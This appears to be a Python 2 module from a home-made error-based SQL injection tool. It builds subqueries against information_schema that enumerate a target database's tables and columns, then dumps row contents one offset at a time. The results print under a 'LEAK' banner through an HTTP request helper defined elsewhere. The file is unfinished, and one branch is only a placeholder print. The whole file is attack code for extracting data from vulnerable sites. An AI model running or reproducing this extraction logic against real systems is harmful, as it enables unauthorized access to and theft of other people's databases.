# -*- coding: utf-8 -*-

import httplib
import urllib
from urlparse import urlparse
import sys
import argparse
import setting as set


# Setting Argument


def error_based_sql(db_type):
    # First checking table nums
    if set.args.column != "" and set.args.table != "":
        get_cnt_query('d')
    elif set.args.table != "":
        get_cnt_query('c')
    else:  # 구현쓰중
        print('c')

        get_cnt_query('t')


def get_data(div, count):
    print "Finded " + count + " Data"
    print "============LEAK============"
    for i in range(0, int(count)):
        vuln_part = get_data_query(div, i)
        print set.error_httpreq(vuln_part)
    print "============================"


def get_data_query(div, count):
    if div == 't':
        tname = "(select table_name from information_schema.tables where table_type='base table' limit 1 offset " + str(count) + ")"
        return tname
    elif div == 'c':
        cname = "(select column_name from information_schema.columns where table_name='" + set.args.table + "' limit 1 offset " + str(count) + ")"
        return cname
    elif div == 'd':
        dname = "(select concat_ws(0x2c," + set.args.column + ") from " + set.args.table + " limit 1 offset " + str(count) + ")"
        return dname


def get_cnt_query(div):
    if div == 't':
        tcount = "(select count(*) from information_schema.tables where table_type='base table')"  # table  개수 확인
        count = set.error_httpreq(tcount)
        get_data('t', count)
    elif div == 'c':
        ccount = "(select count(*) from information_schema.columns where table_name='" + set.args.table + "')"  # column 개수 확인
        count = set.error_httpreq(ccount)
        get_data('c', count)
    elif div == 'd':
        dcount = "(select count(*) from " + set.args.table + ")"  # data 개수 확인
        count = set.error_httpreq(dcount)
        get_data('d', count)
